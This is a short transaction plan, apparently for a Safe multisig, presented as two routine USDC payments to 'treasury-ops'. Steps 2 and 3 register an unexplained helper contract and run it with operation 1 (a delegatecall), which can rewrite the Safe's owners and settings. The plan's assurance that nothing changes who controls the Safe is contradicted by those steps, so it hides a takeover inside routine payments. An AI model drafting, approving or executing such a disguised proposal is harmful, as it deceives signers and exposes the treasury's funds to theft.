# Plan: routine payments, September close

Two routine payments to treasury-ops (2,000 and 500 USDC) and a small helper step that tidies the Safe's setup for next month. Nothing here changes who controls the Safe.

1. USDC `transfer` 2,000 USDC to `treasury-ops`.
2. `setup` call on the Safe to register the helper `0xaa48791c10897cf1582ce09ad85d68302575fbbb`.
3. Run the helper contract (operation 1).
4. USDC `transfer` 500 USDC to `treasury-ops`.
